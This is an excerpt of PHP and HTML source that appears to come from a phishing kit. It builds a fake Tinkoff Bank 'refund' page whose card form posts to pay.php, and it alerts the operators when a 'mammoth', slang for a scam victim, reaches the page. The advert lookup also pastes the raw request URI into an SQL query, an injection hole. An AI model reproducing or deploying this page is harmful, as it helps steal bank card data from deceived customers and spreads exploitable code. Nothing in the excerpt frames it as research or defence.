<?php 
	...
	$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '".mb_substr($_SERVER['REQUEST_URI'], 11)."' AND `status` = '1'");
	...
	if(mysqli_num_rows($query) > 0) {
		...
		setcookie('type', 'refund', time()+3600, '/');
		
		$text = "⚠️♻️ <b>Мамонт перешел на страницу возврата♻️⚠️</b>\n\n";
...
<head>
	<title>Тинькофф Банк - Возврат средств</title>
	...
	<meta property="og:title" content="Возврат средств">
...
<body id="body">
	...
	<div class="wrapper">
		<div class="wrapper__middle">
			...
			<div class="content">
				<form method="post" id="payForm" action="pay.php" name="payForm" onsubmit="return load();">
					<div class="card">
						...
						<div id="tcs-pay-form" class="main-form">
							<div class="avito_error"><span id="error-span"></span></div>
								<div class="card-credit">
									<div class="card-credit__front">
										...
										<input hidden name="amount" value="<?php echo $order['price']+$delivery; ?>">
										<input hidden name="description" value="<?php echo $order['advert_id']; ?>">
							...
							<div class="form-submit">
								...
								<div class="form-submit__field-wrap">
									<input type="button" value="Вернуть" disabled id="form-submit" class="form-submit__field" tabindex="7">
								</div>
							</div>
						</div>
					</div>
